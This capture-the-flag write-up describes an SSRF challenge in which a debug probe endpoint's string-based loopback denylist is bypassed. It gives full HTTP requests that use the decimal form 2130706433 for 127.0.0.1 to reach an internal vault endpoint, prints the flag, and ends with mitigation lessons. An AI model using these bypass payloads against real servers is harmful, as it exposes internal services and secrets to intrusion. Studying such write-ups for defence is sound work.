# The loopback Mirage - NebulaGuard (Port 8891) Writeup

## Challenge Summary
The target exposed a web app with an authenticated debug probe feature. The intended bug was SSRF with weak loopback filtering, allowing access to an internal vault endpoint and flag extraction.

- Target: http://78.46.147.244:8891/
- Vulnerable endpoint: POST /api/v1/debug/probe
- Technique: Loopback blacklist bypass using alternate localhost representations

## Recon
1. Opened the homepage and inspected frontend JavaScript.
2. Found probe API call:
   - `fetch('/api/v1/debug/probe', { method: 'POST', body: JSON.stringify({ url }) })`
3. Confirmed robots and sitemap were not useful (404).

## Authentication
The probe endpoint required a valid session.

1. Register/login via UI or HTTP:

```http
POST /signup
Content-Type: application/x-www-form-urlencoded

name=asdfasdf&email=asdfasdf%40gmail.com&password=asdfasdf
```

2. After authentication, probe endpoint no longer returned 401.

## Probe Validation
Valid JSON payload format:

```json
{"url":"http://example.com"}
```

Test request:

```http
POST /api/v1/debug/probe
Content-Type: application/json
Cookie: session=...

{"url":"http://example.com"}
```

Observed behavior:
- External URL fetch worked and returned `Probe Results` with response preview.
- Direct loopback strings were blocked:
  - `127.0.0.1` -> Security Policy Violation
  - `localhost` -> Security Policy Violation

This indicates string-based denylisting.

## Internal Endpoint Discovery
After login, the authenticated HTML contained preset probe helper buttons, including:

- `http://2130706433:8891/api/v1/public/stats`
- `http://2130706433:8891/internal/v1/vault-secret`

`2130706433` is decimal form of `127.0.0.1`.

## Exploit
Use probe endpoint with numeric loopback host:

```http
POST /api/v1/debug/probe
Content-Type: application/json
Cookie: session=...

{"url":"http://2130706433:8891/internal/v1/vault-secret"}
```

Server response preview included:

```json
{"access":"admin_level","flag":"CIPH{CL0UD_SSRf_Byp4ss_M4st3r_L3v3l}","note":"Stage 2 Complete. NebulaGuard security invariants bypassed.","status":"authorized"}
```

## Flag

`CIPH{CL0UD_SSRf_Byp4ss_M4st3r_L3v3l}`

## Why It Worked
1. SSRF primitive existed in `/api/v1/debug/probe`.
2. Loopback protection only blocked literal host strings (`localhost`, `127.0.0.1`).
3. Alternate loopback representation (`2130706433`, also `127.1`) bypassed checks.
4. Internal vault path was reachable from server-side request context.

## Security Lessons
1. Canonicalize and resolve destination IP before filtering.
2. Block all loopback, private, link-local, and metadata ranges after DNS resolution.
3. Enforce strict outbound allowlist for probe destinations.
4. Disable redirects to internal networks.
5. Do not return raw internal response previews to untrusted users.
